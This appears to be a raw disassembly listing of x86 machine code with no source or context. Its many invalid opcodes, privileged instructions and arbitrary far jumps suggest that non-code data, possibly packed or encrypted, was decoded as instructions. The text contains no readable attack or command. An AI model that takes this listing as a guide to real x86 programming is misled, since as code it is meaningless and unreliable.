  41fb49:	add    dl,BYTE PTR [ecx+0x2d8c9d91]
  41fb4f:	xlat   BYTE PTR ds:[ebx]
  41fb50:	mov    ebx,0x5a2b6a8e
  41fb55:	aas    
  41fb56:	jo     0x41fb7f
  41fb58:	adc    ecx,DWORD PTR [edi]
  41fb5a:	sub    eax,0x6190b9c5
  41fb5f:	dec    edi
  41fb60:	lds    ebx,FWORD PTR [ecx+0x30]
  41fb63:	cmp    BYTE PTR [esi-0x4e4411a9],al
  41fb69:	cdq    
  41fb6a:	jge    0x41fb72
  41fb6c:	xchg   ecx,eax
  41fb6d:	xchg   ebp,eax
  41fb6e:	xor    eax,0xd87e1f47
  41fb73:	dec    ebx
  41fb74:	jnp    0x41fb32
  41fb76:	sbb    edx,ebx
  41fb78:	xor    eax,0x1b716a65
  41fb7d:	int3   
  41fb7e:	test   eax,0x6c5cf9a0
  41fb83:	test   al,0x5c
  41fb85:	and    al,BYTE PTR [esi+esi*2+0x25]
  41fb89:	pop    edi
  41fb8a:	aad    0x71
  41fb8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb8d:	dec    esi
  41fb8e:	aam    0xd1
  41fb90:	les    ebp,FWORD PTR [ecx+0x6497be47]
  41fb96:	add    cl,BYTE PTR es:[edx]
  41fb99:	inc    eax
  41fb9a:	outs   dx,BYTE PTR ds:[esi]
  41fb9b:	inc    ebx
  41fb9c:	mov    bh,0xf7
  41fb9e:	xchg   edi,eax
  41fb9f:	and    ch,BYTE PTR [ebx+0x6]
  41fba2:	xchg   DWORD PTR [ecx+0x11ee6083],eax
  41fba8:	es aad 0xab
  41fbab:	jnp    0x41fbda
  41fbad:	addr16 dec eax
  41fbaf:	mov    ch,0xc5
  41fbb1:	inc    esp
  41fbb2:	pop    esi
  41fbb3:	xchg   ecx,eax
  41fbb4:	adc    ch,BYTE PTR [ebp+0x76]
  41fbb7:	test   eax,0x58f9bfee
  41fbbc:	(bad)  
  41fbbd:	jecxz  0x41fc2a
  41fbbf:	je     0x41fba6
  41fbc1:	dec    esi
  41fbc2:	and    eax,0x7c8357d
  41fbc7:	push   edx
  41fbc8:	adc    al,0x66
  41fbca:	test   BYTE PTR [ecx],ch
  41fbcc:	ds mov bl,0x86
  41fbcf:	sub    DWORD PTR [edx+0x1a98c036],ecx
  41fbd5:	mov    esi,edi
  41fbd7:	lds    ecx,FWORD PTR [ebx+0x34]
  41fbda:	mov    ebp,0x404f4be2
  41fbdf:	push   0x76
  41fbe1:	push   ecx
  41fbe2:	sub    ebp,edi
  41fbe4:	mov    ebx,0xb375d4c6
  41fbe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbea:	int3   
  41fbeb:	cmc    
  41fbec:	dec    eax
  41fbed:	mov    edx,0x9a31b05e
  41fbf2:	iret   
  41fbf3:	(bad)  
  41fbf4:	pop    ds
  41fbf5:	push   eax
  41fbf6:	popa   
  41fbf7:	mov    ecx,0x171720eb
  41fbfc:	jg     0x41fb7f
  41fbfe:	jbe    0x41fb96
  41fc00:	xchg   ebp,eax
  41fc01:	pop    ecx
  41fc02:	mov    dl,0xfc
  41fc04:	xchg   ebx,eax
  41fc05:	fstp   TBYTE PTR [esi-0x3fb6660c]
  41fc0b:	and    eax,0xdc5e0a53
  41fc10:	jge    0x41fc17
  41fc12:	jb     0x41fc5a
  41fc14:	dec    eax
  41fc15:	pop    ecx
  41fc16:	mov    bl,bl
  41fc18:	repnz dec edx
  41fc1a:	arpl   WORD PTR [edx+0x3a959039],di
  41fc20:	mov    WORD PTR [ebx],?
  41fc22:	cwde   
  41fc23:	ds sbb al,0x88
  41fc26:	xchg   BYTE PTR [edi-0x33],al
  41fc29:	pop    es
  41fc2a:	cld    
  41fc2b:	ss ja  0x41fc8b
  41fc2e:	ds inc edx
  41fc30:	repz aaa 
  41fc32:	push   0x34
  41fc34:	mov    ds:0x471c23d7,al
  41fc39:	cmp    DWORD PTR [eax+0x5b],ecx
  41fc3c:	(bad)  
  41fc3d:	adc    esi,0x830ed8c6
  41fc43:	int    0x15
  41fc45:	jle    0x41fc24
  41fc47:	pop    ds
  41fc48:	mov    ebx,0xdbbcaac5
  41fc4d:	repz test DWORD PTR [ecx-0x42],edx
  41fc51:	push   esi
  41fc52:	dec    eax
  41fc53:	xor    DWORD PTR [ecx],esi
  41fc55:	or     DWORD PTR [ebx+eiz*2+0x6d994727],0xffffff9a
  41fc5d:	dec    ebx
  41fc5e:	push   ebp
  41fc5f:	stc    
  41fc60:	ss dec edi
  41fc63:	es aas 
  41fc65:	out    0x72,eax
  41fc67:	cmp    DWORD PTR [edi],0x7
  41fc6a:	mul    DWORD PTR [ebx]
  41fc6c:	mov    DWORD PTR [ecx],esi
  41fc6e:	sti    
  41fc6f:	lea    edx,[edx]
  41fc71:	lahf   
  41fc72:	rcl    DWORD PTR [ebx+esi*2-0x31],0xac
  41fc77:	lea    edi,[edx+esi*1]
  41fc7a:	mov    eax,ds:0x56799c57
  41fc7f:	sbb    al,0x67
  41fc81:	or     DWORD PTR [ebx],eax
  41fc83:	jae    0x41fcdf
  41fc85:	jno    0x41fc7f
  41fc87:	mov    DWORD PTR [edx+0x25],eax
  41fc8a:	into   
  41fc8b:	pop    esi
  41fc8c:	repnz clc 
  41fc8e:	imul   ebx,DWORD PTR ds:0x47d0a012,0xc10a0907
  41fc98:	jmp    0x29af:0xd0d1eae4
  41fc9f:	and    al,0xe
  41fca1:	inc    esp
  41fca2:	in     al,dx
  41fca3:	cmp    BYTE PTR [edx+0x2c7939db],bl
  41fca9:	pop    ss
  41fcaa:	imul   edx,esi,0xbec38c28
  41fcb0:	mov    edi,0xcdc9dc93
  41fcb5:	in     al,0x5
  41fcb7:	cli    
  41fcb8:	aas    
  41fcb9:	sub    ecx,DWORD PTR [edi+0x3d1c879e]
  41fcbf:	mov    ds:0x557e8772,al
  41fcc4:	and    eax,0x3e7444a9
  41fcc9:	pop    ebp
  41fcca:	add    dl,BYTE PTR ds:0xc77bc8ab
  41fcd0:	leave  
  41fcd1:	out    0xfc,eax
  41fcd3:	arpl   bp,ax
  41fcd5:	xchg   edi,eax
  41fcd6:	lahf   
  41fcd7:	inc    esi
  41fcd8:	and    al,0xb
  41fcda:	cwde   
  41fcdb:	xchg   esi,eax
  41fcdc:	sub    ecx,DWORD PTR [esi+0x50]
  41fcdf:	stos   DWORD PTR es:[edi],eax
  41fce0:	xor    al,0x6a
  41fce2:	jne    0x41fd5a
  41fce4:	pop    es
  41fce5:	xchg   ebp,eax
  41fce6:	or     esi,edx
  41fce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fce9:	sbb    al,0xf4
  41fceb:	xchg   edi,eax
  41fcec:	addr16 dec esi
  41fcee:	jns    0x41fce3
  41fcf0:	and    al,BYTE PTR [esi-0x22b6562a]
  41fcf6:	in     al,0x6c
  41fcf8:	inc    esi
  41fcf9:	mov    esi,0xa0c7fab4
  41fcfe:	cmp    al,0xba
  41fd00:	mov    ds:0xdcf0d15a,eax
  41fd05:	jo     0x41fd3e
  41fd07:	jg     0x41fd53
  41fd09:	mov    al,0x7c
  41fd0b:	icebp  
  41fd0c:	and    BYTE PTR [ebx-0x80],ch
  41fd0f:	cs inc esp
  41fd11:	ret    
  41fd12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd13:	in     eax,0x6d
  41fd15:	pop    eax
  41fd16:	in     al,0x5c
  41fd18:	pop    ecx
  41fd19:	lds    edi,FWORD PTR [eax-0x6b]
  41fd1c:	pop    edx
  41fd1d:	clc    
  41fd1e:	addr16 jo 0x41fcf3
  41fd21:	adc    ebx,DWORD PTR [eax-0x21]
  41fd24:	pop    edx
  41fd25:	inc    edi
  41fd26:	(bad)
  41fd29:	int3   
  41fd2a:	pop    ecx
  41fd2b:	pop    ecx
  41fd2c:	xchg   DWORD PTR [edi],edi
  41fd2e:	mov    ch,0xd7
  41fd30:	or     al,0x37
  41fd32:	int3   
  41fd33:	int3   
  41fd34:	mov    ebp,0x41f090f4
  41fd39:	add    ebp,DWORD PTR [ecx+eiz*1]
  41fd3c:	sub    DWORD PTR [eax],esi
  41fd3e:	lds    ebx,FWORD PTR [esi]
  41fd40:	mov    eax,ds:0x7261511c
  41fd45:	aad    0xbc
  41fd47:	(bad)  
  41fd49:	or     ebx,DWORD PTR [ecx]
  41fd4b:	push   esp
  41fd4c:	outs   dx,BYTE PTR ds:[esi]
  41fd4d:	lea    edi,[edi-0x2d30c9a4]
  41fd53:	sbb    edx,DWORD PTR [edx]
  41fd55:	add    ebx,DWORD PTR [esi]
  41fd57:	ja     0x41fd8a
  41fd59:	jae    0x41fd91
  41fd5b:	jo     0x41fcf8
  41fd5d:	into   
  41fd5e:	fsubr  QWORD PTR [ecx-0x78]
  41fd61:	adc    DWORD PTR [ecx],0x701ec213
  41fd67:	shl    DWORD PTR [eax],0xf
  41fd6a:	bound  edx,QWORD PTR ds:0xddcc66b5
  41fd70:	fisttp DWORD PTR [ebx+0x78]
  41fd73:	add    DWORD PTR [ecx-0x4a],0xe8386831
  41fd7a:	imul   ebx,DWORD PTR [edx-0x60d3960a],0x2848d968
  41fd84:	adc    dl,bh
  41fd86:	inc    ecx
  41fd87:	xchg   esi,eax
  41fd88:	mov    al,0xb9
  41fd8a:	bound  esp,QWORD PTR gs:[esi+0x6eac4371]
  41fd91:	fcomip st,st(3)
  41fd93:	jmp    0xa26c:0xe21eb704
  41fd9a:	mov    BYTE PTR [ebp-0x1c],cl
  41fd9d:	jge    0x41fd93
  41fd9f:	push   edx
  41fda0:	adc    al,BYTE PTR [eax*4-0x3c2953f6]
  41fda7:	inc    edi
  41fda8:	xor    al,0xed
  41fdaa:	cmp    dh,BYTE PTR [ebp+0x137f83a4]
  41fdb0:	int3   
  41fdb1:	adc    dl,BYTE PTR [ebp-0x1cc81bbe]
  41fdb7:	fwait
  41fdb8:	ins    BYTE PTR es:[edi],dx
  41fdb9:	jns    0x41fd3c
  41fdbb:	pusha  
  41fdbc:	mov    DWORD PTR [esi],edx
  41fdbe:	add    ebx,ebp
  41fdc0:	sbb    BYTE PTR [eax-0x66],0xd4
  41fdc4:	xchg   DWORD PTR [edi+0x5622047a],ebx
  41fdca:	(bad)
  41fdce:	std    
  41fdcf:	push   ebx
  41fdd0:	call   0x8f20:0xa3749431
  41fdd7:	push   ebx
  41fdd8:	sbb    eax,0xf536d48
  41fddd:	lock jecxz 0x41fe0f
  41fde0:	xor    eax,0x46524043
  41fde5:	rcl    BYTE PTR [eax+ebp*2],0x3a
  41fde9:	std    
  41fdea:	aas    
  41fdeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdec:	pusha  
  41fded:	imul   eax,DWORD PTR [eax],0xffffffcb
  41fdf0:	mov    ah,0xe6
  41fdf2:	adc    al,0xad
  41fdf4:	cmp    DWORD PTR [edi-0x6],0xfffffff4
  41fdf8:	call   0x3cd87fa8
  41fdfd:	or     eax,0xee51c93a
  41fe02:	scas   eax,DWORD PTR es:[edi]
  41fe03:	push   cs
  41fe04:	sbb    eax,0x477f44d3
  41fe09:	sbb    ecx,DWORD PTR [ecx-0x7a]
  41fe0c:	pop    esp
  41fe0d:	lods   eax,DWORD PTR ds:[esi]
  41fe0e:	sub    eax,0x74935249
  41fe13:	rol    DWORD PTR [eax+0x5c],cl
  41fe16:	cmp    BYTE PTR [esp+edx*4-0x40],bl
  41fe1a:	stos   BYTE PTR es:[edi],al
  41fe1b:	rol    esi,cl
  41fe1d:	and    DWORD PTR [esi+0x330466e0],0x286ef3f7
  41fe27:	add    BYTE PTR [eax-0x5b4d043a],ah
  41fe2d:	mov    ss,WORD PTR [ecx]
  41fe2f:	das    
  41fe30:	stc    
  41fe31:	or     ch,BYTE PTR [ecx-0x43560805]
  41fe37:	repnz aaa 
  41fe39:	sub    al,0xb3
  41fe3b:	sbb    al,0x37
  41fe3d:	push   0xfffffffa
  41fe3f:	push   ebp
  41fe40:	xor    BYTE PTR [edi-0x70],al
  41fe43:	cmp    bh,BYTE PTR [edx-0x4a]
  41fe46:	xchg   ebp,eax
  41fe47:	test   DWORD PTR [ebx-0x3a486703],ebx
  41fe4d:	lods   eax,DWORD PTR ds:[esi]
  41fe4e:	pop    ebp
  41fe4f:	rol    BYTE PTR ds:0x6484be69,1
  41fe55:	cmp    BYTE PTR [ebx-0x20],al
  41fe58:	fadd   DWORD PTR [edx+eiz*1]
  41fe5b:	int    0x6
  41fe5d:	xchg   edi,eax
  41fe5e:	and    dl,BYTE PTR [ebx+0xb]
  41fe61:	loopne 0x41fe0f
  41fe63:	popf   
  41fe64:	mov    ah,0x96
  41fe66:	out    dx,al
  41fe67:	out    dx,al
  41fe68:	sub    dl,bl
  41fe6a:	add    ebp,edx
  41fe6c:	pop    edx
  41fe6d:	ins    DWORD PTR es:[edi],dx
  41fe6e:	enter  0xe2ef,0xc7
  41fe72:	call   0x860e4358
  41fe77:	imul   esi,ecx,0xffffff99
  41fe7a:	or     al,0x47
  41fe7c:	ins    DWORD PTR es:[edi],dx
  41fe7d:	cmp    ebp,DWORD PTR gs:[edi+0x8ddb8a4]
  41fe84:	pop    ss
  41fe85:	push   ss
  41fe86:	les    edi,FWORD PTR ss:[esi+0x183c5ca4]
  41fe8d:	add    eax,0x8ddf839d
  41fe92:	out    dx,eax
  41fe93:	jmp    0x2d36fcf
  41fe98:	jmp    0x480d627f
  41fe9d:	xchg   edx,eax
  41fe9e:	mov    edx,0xd5a3c7cd
  41fea3:	scas   al,BYTE PTR es:[edi]
  41fea4:	push   esp
  41fea5:	cli    
  41fea6:	adc    al,0x42
  41fea8:	arpl   WORD PTR [eax+ebp*4],di
  41feab:	xchg   ebx,ebp
  41fead:	cmp    dh,BYTE PTR [ebp+0x22b4f6b1]
  41feb3:	jmp    0x41fea6
  41feb5:	jg     0x41fe83
  41feb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feb8:	add    BYTE PTR [edx],dl
  41feba:	bndstx [eax],(bad)
  41febd:	das    
  41febe:	or     DWORD PTR [esi],edx
  41fec0:	repz call 0xd8d2:0x9a8fafe3
  41fec8:	retf   
  41fec9:	clc    
  41feca:	into   
  41fecb:	and    al,0x7f
  41fecd:	sub    al,0x4c
  41fecf:	shl    BYTE PTR [edx+ebp*1+0x3b3d0cf9],1
  41fed6:	jecxz  0x41ff41
  41fed8:	jbe    0x41fec4
  41feda:	int    0xe0
  41fedc:	mov    bl,0xde
  41fede:	out    0x51,eax
  41fee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fee1:	mov    dl,0xb2
  41fee3:	mov    al,0xd6
  41fee5:	ffree  st(4)
  41fee7:	pop    es
  41fee8:	mov    bh,0xa
  41feea:	adc    edi,DWORD PTR fs:[edi]
  41feed:	test   DWORD PTR [esi+0x39],edi
  41fef0:	xchg   esi,eax
  41fef1:	adc    DWORD PTR [esi+0x29590516],edx
  41fef7:	push   edi
  41fef8:	std    
  41fef9:	cwde   
  41fefa:	xchg   ecx,eax
  41fefb:	int3   
  41fefc:	dec    esi
  41fefd:	iret   
  41fefe:	ret    
  41feff:	push   cs
  41ff00:	or     al,0x84
  41ff02:	mov    WORD PTR [ecx+0x686a6101],ss
  41ff08:	xor    ah,dh
  41ff0a:	xchg   ebx,eax
  41ff0b:	jae    0x41ff66
  41ff0d:	fild   DWORD PTR [esi]
  41ff0f:	xchg   BYTE PTR [ebx-0x39c05dc],al
  41ff15:	mov    bl,0x9a
  41ff17:	(bad)  
  41ff18:	fcmovu st,st(6)
  41ff1a:	mov    ecx,0x3ccbc5ce
  41ff1f:	clc    
  41ff20:	jmp    0x9354e088
  41ff25:	aaa    
  41ff26:	push   edx
  41ff27:	lds    esi,FWORD PTR [ebp+ebx*2+0x23d19496]
  41ff2e:	in     eax,dx
  41ff2f:	ror    DWORD PTR [eax],cl
  41ff31:	mov    cl,0xa7
  41ff33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff34:	push   ebx
  41ff35:	lods   al,BYTE PTR ds:[esi]
  41ff36:	mov    ecx,0xbef48594
  41ff3b:	xchg   edi,eax
  41ff3c:	xchg   edi,eax
  41ff3d:	dec    eax
  41ff3e:	out    0x77,al
  41ff40:	adc    bl,BYTE PTR [edi+0xfc4c6fb]
  41ff46:	enter  0x4c7c,0xbb
  41ff4a:	lea    esp,ds:0xb2a5f244
  41ff50:	(bad)  
  41ff51:	inc    eax
  41ff52:	ja     0x41ff94
  41ff54:	jmp    0xb74b97d6
  41ff59:	sub    eax,0x654855e1
  41ff5e:	jne    0x41ff64
  41ff60:	fcmovnb st,st(1)
  41ff62:	cmc    
  41ff63:	js     0x41ffde
  41ff65:	in     eax,dx
  41ff66:	retf   
  41ff67:	add    al,0xb6
  41ff69:	inc    esp
  41ff6a:	jle    0x41ff21
  41ff6c:	out    0xce,al
  41ff6e:	shr    BYTE PTR [ecx+0x71c27d22],cl
  41ff74:	inc    edi
  41ff75:	or     DWORD PTR [eax],0x77
  41ff78:	les    edx,FWORD PTR [edx+ebp*8]
  41ff7b:	cmp    al,0x74
  41ff7d:	fdivrp st(6),st
  41ff7f:	fld    st(3)
  41ff81:	je     0x41ff6a
  41ff83:	stc    
  41ff84:	or     BYTE PTR [ecx-0x68394cfb],0xce
  41ff8b:	inc    esi
  41ff8c:	push   esi
  41ff8d:	and    DWORD PTR [edx+0x39],esi
  41ff90:	clc    
  41ff91:	inc    DWORD PTR [esi]
  41ff93:	jp     0x41ff62
  41ff95:	dec    edi
  41ff96:	jo     0x41ffba
  41ff98:	shl    DWORD PTR [ecx-0x22],cl
  41ff9b:	mov    al,0x49
  41ff9d:	(bad)  [edx-0x3bbac9d0]
  41ffa3:	add    eax,eax
  41ffa5:	and    dl,al
  41ffa7:	push   ss
  41ffa8:	les    ebx,FWORD PTR [edi-0x77d05e21]
  41ffae:	cli    
  41ffaf:	clc    
  41ffb0:	ret    
  41ffb1:	mov    ds:0xd3b035b,eax
  41ffb6:	outs   dx,BYTE PTR ds:[esi]
  41ffb7:	jns    0x41ff8c
  41ffb9:	xor    ebx,0x8d3a93f6
  41ffbf:	dec    edi
  41ffc0:	mov    dl,0x6a
  41ffc2:	pop    ss
  41ffc3:	arpl   WORD PTR [ebx-0x717b9c23],bp
  41ffc9:	ja     0x41ff70
  41ffcb:	out    dx,eax
  41ffcc:	lds    eax,FWORD PTR [edi+0x1a803278]
  41ffd2:	or     eax,0xb3f58258
  41ffd7:	ror    ecx,cl
  41ffd9:	mov    ah,0x7
  41ffdb:	dec    eax
  41ffdc:	mov    cl,0xe8
  41ffde:	(bad)  
  41ffdf:	loopne 0x41ff94
  41ffe1:	lods   al,BYTE PTR ds:[esi]
  41ffe2:	push   eax
  41ffe3:	div    BYTE PTR [ecx-0x42903286]
  41ffe9:	loope  0x41ff8d
  41ffeb:	mov    al,ds:0xec9c0cfd
  41fff0:	xchg   esp,eax
  41fff1:	fadd   DWORD PTR cs:[edx-0x58]
  41fff5:	or     BYTE PTR [ecx],ah
  41fff7:	jp     0x420026
  41fff9:	xchg   edx,eax
  41fffa:	and    eax,0x9929bbb9
  41ffff:	test   eax,edi
  420001:	in     al,dx
  420002:	pop    esp
  420003:	cdq    
  420004:	scas   eax,DWORD PTR es:[edi]
  420005:	dec    ecx
  420006:	div    DWORD PTR [edi+0x3bace2d5]
  42000c:	inc    eax
  42000d:	mov    es,ebp
  42000f:	inc    eax
  420010:	pop    ecx
  420011:	js     0x41ffbf
  420013:	mov    eax,ds:0x977b332e
  420018:	not    BYTE PTR [ebp+0x6e]
  42001b:	stc    
  42001c:	outs   dx,DWORD PTR ds:[esi]
  42001d:	xchg   ecx,eax
  42001e:	mov    ecx,0xa3aa773c
  420023:	mov    BYTE PTR [ebp+0x76],0x6a
  420027:	cmp    esp,DWORD PTR [esi-0x4b]
  42002a:	push   esp
  42002b:	arpl   WORD PTR [ebp+eiz*2-0x7d5894c5],sp
  420032:	popf   
  420033:	sahf   
  420034:	outs   dx,DWORD PTR ds:[esi]
  420035:	push   esp
  420036:	sub    DWORD PTR [eax-0x7d],ebx
  420039:	pop    ebp
  42003a:	test   BYTE PTR [esi],al
  42003c:	sub    DWORD PTR [esi+0x40b36cae],esi
  420042:	add    BYTE PTR [ecx+0x70],dl
  420045:	cmp    DWORD PTR [esi+0x40],eax
  420048:	sbb    dh,bh
  42004a:	fist   DWORD PTR [edi+0x3c8b98c3]
  420050:	add    al,0xbc
  420052:	dec    ebx
  420053:	pop    ss
  420054:	ret    0xd328
  420057:	inc    eax
  420058:	addr16 loopne 0x42004d
  42005b:	imul   ecx,ebp,0x50
  42005e:	les    ebx,FWORD PTR [eax]
  420060:	mov    ch,0x64
  420062:	mov    cs,WORD PTR [edx-0x7607429e]
  420068:	push   0xffffff9f
  42006a:	iret   
  42006b:	into   
  42006c:	sbb    BYTE PTR [edx-0x1c],bl
  42006f:	mov    al,ds:0x8c4b57da
  420074:	add    DWORD PTR [ecx+0x44fa3ccc],ebx
  42007a:	(bad)  
  42007c:	sbb    al,0x37
  42007e:	inc    ecx
  42007f:	cmp    al,0x98
  420081:	push   edi
  420082:	add    eax,0xb37fe902
  420087:	bswap  esi
  420089:	clc    
  42008a:	stos   BYTE PTR es:[edi],al
  42008b:	fstp   DWORD PTR [edx+0x57]
  42008e:	xor    BYTE PTR ds:0xac911396,cl
  420094:	mov    al,0x60
  420096:	fwait
  420097:	mov    esp,0x910c8f67
  42009c:	outs   dx,BYTE PTR ds:[esi]
  42009d:	jne    0x420025
  42009f:	retf   0xa1a
  4200a2:	sub    DWORD PTR [ebp+0x38],edi
  4200a5:	add    ecx,DWORD PTR [ebx-0x5]
  4200a8:	call   0x5561b37f
  4200ad:	out    dx,al
  4200ae:	and    esp,DWORD PTR [ebp+0x662d0eb7]
  4200b4:	and    DWORD PTR [eax+edx*8+0x75d3bcaf],ecx
  4200bb:	mov    edx,0xd4e87035
  4200c0:	cmp    bl,ch
  4200c2:	mov    cl,bh
  4200c4:	repnz mov ebp,0x323287ee
  4200ca:	xor    edx,DWORD PTR ds:0x414c9e2d
  4200d0:	xor    DWORD PTR [ecx+edi*2],ecx
  4200d3:	jno    0x4200b1
  4200d5:	mov    ds:0x194625c9,eax
  4200da:	pop    esp
  4200db:	cmp    edx,DWORD PTR [edi-0x42]
  4200de:	jb     0x4200d5
  4200e0:	rcr    DWORD PTR [ebp-0x6af33431],cl
  4200e6:	xor    BYTE PTR [eax],dh
  4200e8:	stc    
  4200e9:	imul   esi,DWORD PTR [esi-0x7a2054bb],0xd98c3bac
  4200f3:	and    ebp,DWORD PTR [edx+0x47183f5e]
  4200f9:	xor    ecx,esi
  4200fb:	rcr    DWORD PTR [ebp-0x1b],1
  4200fe:	mov    dl,0xce
  420100:	imul   edx,DWORD PTR [eax-0xc6c8343],0x26
  420107:	sbb    DWORD PTR [ebx+0x7e],edi
  42010a:	sti    
  42010b:	mov    esp,0x651bb3b1
  420110:	push   cs
  420111:	ds js  0x420116
  420114:	and    BYTE PTR [esi+0x4],al
  420117:	fsubr  DWORD PTR ss:[ebx-0x5d]
  42011b:	out    dx,eax
  42011c:	(bad)  
  42011d:	pop    ebp
  42011e:	ret    0xab57
  420121:	jne    0x420123
  420123:	mov    dh,0x57
  420125:	and    BYTE PTR [ecx],ch
  420127:	(bad)  
  420129:	ret    0xcc4b
  42012c:	fcmovbe st,st(7)
  42012e:	shl    DWORD PTR [ebp+0x568fb289],1
  420134:	jge    0x420116
  420136:	ins    DWORD PTR es:[edi],dx
  420137:	sahf   
  420138:	jge    0x42014c
  42013a:	ret    0x9983
  42013d:	jmp    0x42016f
  42013f:	iret   
  420140:	sbb    BYTE PTR [eax+0x34],cl
  420143:	push   edi
  420144:	mov    esp,0xd9038dbb
  420149:	push   es
  42014a:	daa    
  42014b:	and    al,0x3b
  42014d:	aas    
  42014e:	and    bh,BYTE PTR [ecx+0x74]
  420151:	int    0xd6
  420153:	inc    edi
  420154:	jge    0x4201d5
  420156:	ror    DWORD PTR [esi-0x7c3c893b],1
  42015c:	pop    ss
  42015d:	scas   al,BYTE PTR es:[edi]
  42015e:	and    al,0x8e
  420160:	push   ecx
  420161:	pop    es
  420162:	and    ebp,DWORD PTR ds:0x50fe9ab7
  420168:	sbb    bl,BYTE PTR [edx+0x4f]
  42016b:	shr    BYTE PTR [eax],cl
  42016d:	ret    
  42016e:	cmp    eax,DWORD PTR [ebp-0x5c]
  420171:	mov    ebp,0x529b5543
  420176:	enter  0x5310,0x93
  42017a:	xor    BYTE PTR [ecx-0x4d],dh
  42017d:	ficomp DWORD PTR [edi+0x4fad7abd]
  420183:	out    dx,eax
  420184:	fwait
  420185:	in     eax,dx
  420186:	jbe    0x4201f0
  420188:	nop
  420189:	jae    0x420184
  42018b:	dec    edx
  42018c:	add    eax,0xad4e617c
  420191:	je     0x420147
  420193:	pop    ecx
  420194:	add    eax,0x39ea7c7
  420199:	pop    edi
  42019a:	lea    ebp,[ebx+edx*1+0x2c]
  42019e:	inc    edi
  42019f:	xchg   esp,eax
  4201a0:	clc    
  4201a1:	xor    BYTE PTR [edi-0x74],bl
  4201a4:	out    dx,eax
  4201a5:	xchg   edi,eax
  4201a6:	xor    bh,BYTE PTR [edx+0x54]
  4201a9:	scas   al,BYTE PTR es:[edi]
  4201aa:	loop   0x420207
  4201ac:	outs   dx,BYTE PTR ds:[esi]
  4201ad:	mov    BYTE PTR ds:0x5c27f2a0,dl
  4201b3:	push   ss
  4201b4:	clc    
  4201b5:	mov    ebp,0x38d42009
  4201ba:	push   edi
  4201bb:	repz sbb bl,ah
  4201be:	jecxz  0x420153
  4201c0:	fs mov al,0x98
  4201c3:	(bad)  
  4201c4:	mov    DWORD PTR [eax+eax*4-0x12],esp
  4201c8:	xchg   ebp,eax
  4201c9:	cmp    al,0x80
  4201cb:	test   DWORD PTR [ebp+0x20125e31],edi
  4201d1:	pop    esi
  4201d2:	inc    ebp
  4201d3:	lock xchg ecx,eax
  4201d5:	clc    
  4201d6:	popa   
  4201d7:	push   0xd9c93606
  4201dc:	push   edi
  4201dd:	add    BYTE PTR [esi-0x4f],ah
  4201e0:	jle    0x420238
  4201e2:	ja     0x42023a
  4201e4:	cdq    
  4201e5:	dec    ebx
  4201e6:	sbb    edx,ebp
  4201e8:	sahf   
  4201e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ea:	xlat   BYTE PTR ds:[ebx]
  4201eb:	int    0x6
  4201ed:	sbb    al,0x2e
  4201ef:	aad    0xf5
  4201f1:	pop    eax
  4201f2:	arpl   WORD PTR [ecx-0x11],si
  4201f5:	rol    DWORD PTR [edx],1
  4201f7:	xor    esp,DWORD PTR [ebx+0x74cec287]
  4201fd:	add    BYTE PTR [edi+0xd],ah
  420200:	adc    eax,0xe94e3f0f
  420205:	push   eax
  420206:	and    edx,DWORD PTR [esi+0x196084b6]
  42020c:	jb     0x42020c
  42020e:	loope  0x4201b3
  420210:	dec    ebx
  420211:	repnz inc ebx
  420213:	pop    es
  420214:	popf   
  420215:	(bad)  
  420216:	push   0x97acc48d
  42021b:	inc    ebx
  42021c:	ret    
  42021d:	scas   al,BYTE PTR es:[edi]
  42021e:	outs   dx,BYTE PTR ds:[esi]
  42021f:	fldcw  WORD PTR ss:[ecx-0x77]
  420223:	sahf   
  420224:	outs   dx,DWORD PTR ds:[esi]
  420225:	pop    esi
  420226:	xchg   esp,eax
  420227:	mov    al,dl
  420229:	add    ebx,DWORD PTR [edi+0x2a7474bc]
  42022f:	dec    eax
  420230:	adc    DWORD PTR [esi-0x33ed421d],esi
  420236:	div    al
  420238:	ficom  WORD PTR [esi]
  42023a:	popa   
  42023b:	push   edx
  42023c:	cmp    al,0x10
  42023e:	mov    bl,0x6b
  420240:	(bad)
  420243:	arpl   bp,dx
  420245:	stos   BYTE PTR es:[edi],al
  420246:	dec    esp
  420247:	stos   BYTE PTR es:[edi],al
  420248:	or     DWORD PTR [ebx-0x66b529be],eax
  42024e:	out    dx,eax
  42024f:	push   ebp
  420250:	and    ebx,DWORD PTR [ebx-0x1ee7d3fc]
  420256:	inc    ebp
  420257:	cmp    dl,ah
  420259:	loopne 0x420287
  42025b:	popa   
  42025c:	mov    eax,ds:0x8f228ab2
  420261:	lods   al,BYTE PTR ss:[esi]
  420263:	adc    dl,BYTE PTR [ecx-0x2b5ead42]
  420269:	fsubr  QWORD PTR [edx]
  42026b:	repz dec ecx
  42026d:	sbb    DWORD PTR [ebp+0x1f4ecbbd],0xffffffe3
  420274:	popa   
  420275:	xor    cl,BYTE PTR [ecx-0x445979db]
  42027b:	adc    DWORD PTR [eax-0x6b72c0a2],ebx
  420281:	int3   
  420282:	mov    esi,0x61ca1e45
  420287:	jmp    0x5c7e:0xc25cbc46
  42028e:	dec    esp
  42028f:	mov    gs,WORD PTR [edi]
  420291:	retf   
  420292:	sub    cl,BYTE PTR [ecx-0x403b1018]
  420298:	dec    ebx
  420299:	dec    esi
  42029a:	ret    
  42029b:	enter  0xcc8b,0xb6
  42029f:	mov    bl,0x62
  4202a1:	inc    esi
  4202a2:	ror    DWORD PTR [edx-0x1b],cl
  4202a5:	inc    ebx
  4202a6:	daa    
  4202a7:	ja     0x420242
  4202a9:	mov    ebp,0xe68e86e2
  4202ae:	test   eax,0xb0c59061
  4202b3:	cs jp  0x42030d
  4202b6:	(bad)  
  4202b7:	sar    dh,1
  4202b9:	shl    bl,cl
  4202bb:	sbb    edi,DWORD PTR fs:0xf0ad63fd
  4202c2:	mov    es,WORD PTR [ecx]
  4202c4:	push   esp
  4202c5:	sub    cl,BYTE PTR [ebp+0x7b]
  4202c8:	mov    ch,0x53
  4202ca:	cld    
  4202cb:	(bad)  
